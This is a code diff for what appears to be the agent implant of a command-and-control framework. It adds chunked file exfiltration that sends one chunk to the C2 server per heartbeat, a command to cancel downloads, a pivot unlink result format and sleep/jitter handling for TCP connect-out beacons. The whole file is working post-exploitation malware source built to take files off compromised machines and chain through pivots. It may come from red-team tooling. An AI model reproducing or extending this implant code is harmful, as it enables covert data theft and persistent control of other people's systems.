@@ -498,48 +498,235 @@ static uint8_t cmd_upload(NaxAgent *a, NaxTask *t,
     return NAX_STATUS_OK;
 }
 
-/* ===== download (read file from disk > send to C2) ===== */
+/* ===== download (chunked, one chunk per heartbeat) ===== */
+/*
+ * Task args: [chunk_size(4LE)][path_len(4LE)][path]
+ *   chunk_size == 0  → use NAX_DL_CHUNK_DEFAULT (512 KB)
+ *   chunk_size clamped to [NAX_DL_CHUNK_MIN, NAX_DL_CHUNK_MAX]
+ *
+ * START result: [NAX_DL_START(1)][file_id(4LE)][file_size(4LE)][name_len(4LE)][name]
+ */
 static uint8_t cmd_download(NaxAgent *a, NaxTask *t,
                              uint8_t **out, uint32_t *out_len)
 {
-    (void)a;
-    char *path = args_to_str(t);
-    if (!path) { *out = (uint8_t *)strdup("download: path required"); *out_len = 23; return NAX_STATUS_ERR; }
+    if (!t->args || t->args_len < 4) {
+        *out = (uint8_t *)strdup("download: args required");
+        *out_len = 22; return NAX_STATUS_ERR;
+    }
 
-    FILE *f = fopen(path, "rb");
-    if (!f) {
+    /* Parse chunk_size (first 4 bytes) */
+    uint32_t chunk_size = (uint32_t)t->args[0]        |
+                          ((uint32_t)t->args[1] << 8)  |
+                          ((uint32_t)t->args[2] << 16) |
+                          ((uint32_t)t->args[3] << 24);
+
+    /* Clamp chunk size */
+    if (chunk_size == 0)
+        chunk_size = NAX_DL_CHUNK_DEFAULT;
+    if (chunk_size < NAX_DL_CHUNK_MIN)
+        chunk_size = NAX_DL_CHUNK_MIN;
+    if (chunk_size > NAX_DL_CHUNK_MAX)
+        chunk_size = NAX_DL_CHUNK_MAX;
+
+    /* Parse path (len-prefixed string after the 4 chunk_size bytes) */
+    if (t->args_len < 8) {
+        *out = (uint8_t *)strdup("download: path required");
+        *out_len = 23; return NAX_STATUS_ERR;
+    }
+    uint32_t off = 4;
+    uint32_t path_len = 0;
+    const char *path_ptr = nax_read_lenstr(t->args, t->args_len, &off, &path_len);
+    if (!path_ptr || path_len == 0) {
+        *out = (uint8_t *)strdup("download: path required");
+        *out_len = 23; return NAX_STATUS_ERR;
+    }
+    char path[4096];
+    if (path_len >= sizeof(path)) path_len = sizeof(path) - 1;
+    memcpy(path, path_ptr, path_len);
+    path[path_len] = '\0';
+
+    /* Open file */
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
         char buf[512];
         snprintf(buf, sizeof(buf), "download: %s: %s", path, strerror(errno));
-        free(path);
-        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
+        *out = (uint8_t *)strdup(buf); *out_len = (uint32_t)strlen(buf);
         return NAX_STATUS_ERR;
     }
 
-    /* Extract basename from path */
-    const char *basename = strrchr(path, '/');
-    basename = basename ? basename + 1 : path;
-    uint32_t name_len = (uint32_t)strlen(basename);
+    /* Get file size */
+    struct stat st;
+    if (fstat(fd, &st) < 0 || !S_ISREG(st.st_mode)) {
+        close(fd);
+        *out = (uint8_t *)strdup("download: not a regular file");
+        *out_len = 28; return NAX_STATUS_ERR;
+    }
+    uint32_t file_size = (uint32_t)st.st_size;
 
-    /* Response layout: [name_len(4LE)][name][file_data] */
-    OutBuf ob = {0};
-    /* Prepend name_len + name */
-    uint8_t nl[4] = {
-        (uint8_t)(name_len), (uint8_t)(name_len>>8),
-        (uint8_t)(name_len>>16), (uint8_t)(name_len>>24)
-    };
-    ob_append(&ob, nl, 4);
-    ob_append(&ob, (const uint8_t *)basename, name_len);
+    /* Basename */
+    const char *bn = strrchr(path, '/');
+    bn = bn ? bn + 1 : path;
+    uint32_t name_len = (uint32_t)strlen(bn);
 
-    free(path);
+    /* Generate random file_id */
+    uint32_t file_id = 0;
+    FILE *rf = fopen("/dev/urandom", "rb");
+    if (rf) { fread(&file_id, 4, 1, rf); fclose(rf); }
+    if (!file_id) file_id = (uint32_t)(uintptr_t)path ^ t->task_id;
 
-    uint8_t tmp[65536];
-    size_t r;
-    while ((r = fread(tmp, 1, sizeof(tmp), f)) > 0)
-        ob_append(&ob, tmp, (uint32_t)r);
-    fclose(f);
+    /* Register download node */
+    NaxDownload *dl = (NaxDownload *)calloc(1, sizeof(NaxDownload));
+    if (!dl) { close(fd); *out = (uint8_t *)strdup("download: nomem"); *out_len = 15; return NAX_STATUS_ERR; }
+    dl->task_id   = t->task_id;
+    dl->file_id   = file_id;
+    dl->fd        = fd;
+    dl->file_size = file_size;
+    dl->bytes_sent = 0;
+    dl->chunk_size = chunk_size;
+    if (name_len >= sizeof(dl->filename)) name_len = sizeof(dl->filename) - 1;
+    memcpy(dl->filename, bn, name_len);
+    dl->filename[name_len] = '\0';
+    dl->next = a->download_head;
+    a->download_head = dl;
 
-    *out = ob.buf; *out_len = ob.len;
+    /* Build START result: [NAX_DL_START(1)][file_id(4LE)][file_size(4LE)][name_len(4LE)][name] */
+    uint32_t result_len = 1 + 4 + 4 + 4 + name_len;
+    uint8_t *result = (uint8_t *)malloc(result_len);
+    if (!result) {
+        a->download_head = dl->next; close(fd); free(dl);
+        *out = (uint8_t *)strdup("download: nomem"); *out_len = 15;
+        return NAX_STATUS_ERR;
+    }
+    uint8_t *p = result;
+    *p++ = NAX_DL_START;
+    p[0]=(uint8_t)file_id;       p[1]=(uint8_t)(file_id>>8);
+    p[2]=(uint8_t)(file_id>>16); p[3]=(uint8_t)(file_id>>24); p+=4;
+    p[0]=(uint8_t)file_size;       p[1]=(uint8_t)(file_size>>8);
+    p[2]=(uint8_t)(file_size>>16); p[3]=(uint8_t)(file_size>>24); p+=4;
+    p[0]=(uint8_t)name_len;       p[1]=(uint8_t)(name_len>>8);
+    p[2]=(uint8_t)(name_len>>16); p[3]=(uint8_t)(name_len>>24); p+=4;
+    memcpy(p, bn, name_len);
+
+    *out = result; *out_len = result_len;
     return NAX_STATUS_OK;
+}
+
+/* ===== nax_process_downloads — called each heartbeat cycle ===== */
+/*
+ * Sends one chunk per active download per heartbeat.
+ * Output packed into a single result buffer:
+ *   [taskId(4LE)][dataLen(4LE)][NAX_DL_CONTINUE(1)][fileId(4LE)][chunk_bytes]
+ *   [taskId(4LE)][5(4LE)][NAX_DL_FINISH(1)][fileId(4LE)]
+ * Returns total bytes written into out.
+ */
+uint32_t nax_process_downloads(NaxAgent *a, uint8_t *out, uint32_t out_cap)
+{
+    uint32_t off = 0;
+    NaxDownload **pp = &a->download_head;
+
+    while (*pp) {
+        NaxDownload *dl = *pp;
+
+        uint32_t chunk_sz = dl->chunk_size ? dl->chunk_size : NAX_DL_CHUNK_DEFAULT;
+        uint32_t want = chunk_sz;
+        if (dl->bytes_sent + want > dl->file_size)
+            want = dl->file_size - dl->bytes_sent;
+
+        /* Clamp want to available buffer space: header(8) + sub(1) + file_id(4) */
+        uint32_t overhead = 8 + 1 + 4;
+        if (off + overhead >= out_cap) { pp = &dl->next; continue; }
+        uint32_t avail = out_cap - off - overhead;
+        if (want > avail) want = avail;
+
+        /* space: header(8) + sub(1) + file_id(4) + data(want) */
+        uint32_t entry_sz = overhead + want;
+        if (off + entry_sz > out_cap) { pp = &dl->next; continue; }
+
+        ssize_t nread = 0;
+        if (want > 0) {
+            nread = read(dl->fd, out + off + 13, want);
+            if (nread <= 0) {
+                /* Read error — close and remove */
+                close(dl->fd); *pp = dl->next; free(dl); continue;
+            }
+        }
+
+        uint32_t data_len = 1 + 4 + (uint32_t)nread;
+        /* taskId */
+        out[off+0]=(uint8_t)dl->task_id;       out[off+1]=(uint8_t)(dl->task_id>>8);
+        out[off+2]=(uint8_t)(dl->task_id>>16); out[off+3]=(uint8_t)(dl->task_id>>24);
+        /* dataLen */
+        out[off+4]=(uint8_t)data_len;       out[off+5]=(uint8_t)(data_len>>8);
+        out[off+6]=(uint8_t)(data_len>>16); out[off+7]=(uint8_t)(data_len>>24);
+        /* sub + fileId */
+        out[off+8] =NAX_DL_CONTINUE;
+        out[off+9] =(uint8_t)dl->file_id;        out[off+10]=(uint8_t)(dl->file_id>>8);
+        out[off+11]=(uint8_t)(dl->file_id>>16);  out[off+12]=(uint8_t)(dl->file_id>>24);
+        /* chunk data starts at off+13 */
+        off += 8 + 1 + 4 + (uint32_t)nread;
+
+        dl->bytes_sent += (uint32_t)nread;
+
+        if (dl->bytes_sent >= dl->file_size) {
+            /* FINISH entry: 8 header + 1 sub + 4 file_id = 13 bytes */
+            if (off + 13 <= out_cap) {
+                uint32_t tid = dl->task_id, fid = dl->file_id;
+                out[off+0]=(uint8_t)tid;   out[off+1]=(uint8_t)(tid>>8);
+                out[off+2]=(uint8_t)(tid>>16); out[off+3]=(uint8_t)(tid>>24);
+                out[off+4]=5; out[off+5]=0; out[off+6]=0; out[off+7]=0;
+                out[off+8]=NAX_DL_FINISH;
+                out[off+9]=(uint8_t)fid;   out[off+10]=(uint8_t)(fid>>8);
+                out[off+11]=(uint8_t)(fid>>16); out[off+12]=(uint8_t)(fid>>24);
+                off += 13;
+            }
+            close(dl->fd); *pp = dl->next; free(dl); continue;
+        }
+
+        pp = &dl->next;
+    }
+    return off;
+}
+
+/* ===== download_cancel — cancela una descarga activa por task_id ===== */
+/*
+ * Args: [task_id(4LE)]
+ * Busca el nodo NaxDownload con ese task_id en download_head,
+ * cierra el fd y lo elimina de la lista.
+ */
+static uint8_t cmd_download_cancel(NaxAgent *a, NaxTask *t,
+                                    uint8_t **out, uint32_t *out_len)
+{
+    if (!t->args || t->args_len < 4) {
+        *out = (uint8_t *)strdup("download_cancel: task_id required");
+        *out_len = 33; return NAX_STATUS_ERR;
+    }
+
+    uint32_t cancel_id = (uint32_t)t->args[0]        |
+                         ((uint32_t)t->args[1] << 8)  |
+                         ((uint32_t)t->args[2] << 16) |
+                         ((uint32_t)t->args[3] << 24);
+
+    NaxDownload **pp = &a->download_head;
+    while (*pp) {
+        NaxDownload *dl = *pp;
+        if (dl->task_id == cancel_id) {
+            close(dl->fd);
+            *pp = dl->next;
+            free(dl);
+            char msg[64];
+            snprintf(msg, sizeof(msg), "download cancelled (task_id=%u)", cancel_id);
+            *out = (uint8_t *)strdup(msg);
+            *out_len = (uint32_t)strlen(msg);
+            return NAX_STATUS_OK;
+        }
+        pp = &dl->next;
+    }
+
+    char msg[64];
+    snprintf(msg, sizeof(msg), "download_cancel: task_id=%u not found", cancel_id);
+    *out = (uint8_t *)strdup(msg);
+    *out_len = (uint32_t)strlen(msg);
+    return NAX_STATUS_ERR;
 }
 
 /* ===== ps_run (fork+exec, capture output) ===== */
@@ -789,11 +976,19 @@ static uint8_t cmd_unlink(NaxAgent *a, NaxTask *t,
     NaxPivot *p = pivot_find(a, pivot_id);
     if (p) {
         pivot_remove(a, pivot_id);
-        const char *msg = "unlink: child pivot disconnected";
-        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+        /* Result wire format: [pivot_id(4LE)][pivot_type(1)]
+         * pivot_type=2 means TCP — matches beacon agent convention.
+         * pl_results.go CMD_UNLINK parses this to call TsPivotDelete. */
+        uint8_t *res = (uint8_t *)malloc(5);
+        if (res) {
+            res[0] = (uint8_t)(pivot_id);        res[1] = (uint8_t)(pivot_id >> 8);
+            res[2] = (uint8_t)(pivot_id >> 16);  res[3] = (uint8_t)(pivot_id >> 24);
+            res[4] = 2; /* TCP pivot type */
+            *out = res; *out_len = 5;
+        }
     } else {
         const char *msg = "unlink: pivot not found";
-        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+        *out = (uint8_t *)strdup(msg); *out_len = (uint32_t)strlen(msg);
     }
     return NAX_STATUS_OK;
 }
@@ -993,6 +1188,7 @@ const char *nax_cmd_name(uint8_t cmd_id)
     case NAX_CMD_EXIT_PROCESS:       return "exit_process";
     case NAX_CMD_ZIP:                return "zip";
     case NAX_CMD_SLEEP:              return "sleep";
+    case NAX_CMD_DOWNLOAD_CANCEL:   return "download_cancel";
     case NAX_CMD_LINK:               return "link";
     case NAX_CMD_UNLINK:             return "unlink";
     case NAX_CMD_BOF:                return "bof";
@@ -1045,6 +1241,7 @@ uint8_t nax_dispatch(NaxAgent *a, NaxTask *t,
     case 0x37:                 return cmd_pivot_exec(a, t, out, out_len);
     case NAX_CMD_ZIP:               return nax_cmd_zip(a, t, out, out_len);
     case NAX_CMD_SLEEP:             return nax_cmd_sleep(a, t, out, out_len);
+    case NAX_CMD_DOWNLOAD_CANCEL:  return cmd_download_cancel(a, t, out, out_len);
     case NAX_CMD_LINK:              return cmd_link(a, t, out, out_len);
     case NAX_CMD_UNLINK:            return cmd_unlink(a, t, out, out_len);
     case NAX_CMD_BOF:               return cmd_bof(a, t, out, out_len);
@@ -1071,20 +1268,17 @@ uint8_t nax_dispatch(NaxAgent *a, NaxTask *t,
     }
 }
 
-/* ===== sleep — set sleep interval (HTTPS only) ===== */
+/* ===== sleep — set sleep interval (HTTPS and TCP connect-out) ===== */
 /* Args: [sleep_ms(4 LE)][jitter_pct(1)]  — 5 bytes
  * Result: [sleep_ms(4 LE)][jitter_pct(1)]["sleep=Xs jitter=Y%"] */
 uint8_t nax_cmd_sleep(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
 {
-#ifndef NAX_HTTPS_MODE
+#ifdef NAX_TCP_MODE_BIND
+    /* Bind/pivot agents are event-driven by parent — sleep not applicable */
     (void)a; (void)t;
-#ifdef NAX_DEBUG
-   const char *msg = "sleep is only supported in HTTPS mode";
-#else
-   const char *msg = "";
-#endif
-    *out = (uint8_t *)malloc(strlen(msg) + 1);
-    if (*out) { memcpy(*out, msg, strlen(msg)); *out_len = strlen(msg); }
+    const char *msg = "sleep: only available in HTTPS and TCP connect-out mode";
+    *out = (uint8_t *)strdup(msg);
+    *out_len = (uint32_t)strlen(msg);
     return NAX_STATUS_ERR;
 #else
     if (!t->args || t->args_len < 5) {
